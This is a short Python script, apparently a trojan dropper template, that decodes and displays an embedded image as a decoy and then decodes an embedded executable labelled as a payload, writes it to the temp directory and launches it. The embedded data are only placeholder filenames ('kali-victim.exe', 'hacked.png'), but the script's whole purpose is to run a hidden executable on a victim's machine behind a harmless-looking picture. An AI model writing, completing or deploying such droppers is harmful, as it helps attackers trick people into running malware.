import subprocess
import tempfile
import shutil
import base64
from PIL import Image
import io
import os

# === Embedded EXE payload ===
payload_b64 = b'''
kali-victim.exe
'''

# === Embedded Image ===
image_b64 = b'''
hacked.png
'''

def save_and_open_image():
    img_data = base64.b64decode(image_b64)
    img = Image.open(io.BytesIO(img_data))
    img.show()

def save_and_run_payload():
    exe_data = base64.b64decode(payload_b64)
    
    temp_dir = tempfile.gettempdir()
    exe_path = os.path.join(temp_dir, "temp_payload.exe")

    with open(exe_path, "wb") as f:
        f.write(exe_data)

    # Execute the payload (hidden window)
    subprocess.Popen(exe_path, shell=True)

def main():
    save_and_open_image()
    save_and_run_payload()

if __name__ == "__main__":
    main()
